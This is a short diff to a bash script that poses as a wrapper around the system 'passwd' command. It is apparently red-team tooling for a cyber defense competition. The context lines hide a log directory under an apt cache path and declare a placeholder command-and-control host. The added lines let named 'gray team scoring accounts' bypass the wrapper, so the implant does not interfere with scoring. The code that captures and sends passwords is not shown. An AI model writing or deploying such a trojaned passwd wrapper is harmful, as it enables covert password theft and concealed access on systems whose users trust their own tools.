@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_PASSWD="/usr/bin/passwd"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_PASSWD "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.sync"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST="__C2_IP__"
